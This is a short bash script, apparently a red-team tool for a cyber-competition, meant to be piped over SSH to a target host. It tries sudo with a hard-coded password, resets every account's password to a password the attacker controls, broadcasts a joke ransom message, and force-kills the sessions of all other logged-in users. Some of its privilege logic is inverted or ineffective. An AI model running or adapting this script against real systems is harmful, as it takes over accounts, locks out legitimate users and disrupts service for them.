#!/bin/bash

## Usage: ssh -t root@domain "bash -s" < ./mine.sh
PW='team4what!?'
ME=$(whoami)
if ! [[ $EUID -eq 0 ]]; then
	echo "###############################################"
	whoami
	echo "###############################################"
	echo "we're root and pwning noobs"
	echo "###############################################"
	userArray=( $(getent passwd | awk -F: '{print $1}' | sed 's/^/"/g;s/$/"/g' | tr '\n' ' ') )
	echo "toastbread" | sudo -S su
	for user in "${!userArray[@]}"; do
		USER=${userArray[user]//\"/}
		## If chpasswd exists
		echo "###############################################"
		echo "${USER}:${PW}"
		echo "###############################################"
		echo "${USER}:${PW}" | chpasswd
		echo "Pwned ${USER}"
	done
fi
#######################
## Ransom funware??? ##
#######################
echo 'Send MEMEs if you want your box back' | wall 2>&-

##################
## Adios amigos ##
##################
connectionArray=( $(who | awk '{print $1}' | grep -v "${ME}" | tr '\n' ' ') )
for everyone_else in "${connectionArray[@]}"; do
	echo "Kicking: ${everyone_else}"
	pkill -KILL -u "${everyone_else}"
done

###################################
## If at first you don't succeed ##
###################################
who | awk '!/root/{ cmd="/usr/bin/pkill -KILL -u " $1; system(cmd)}'
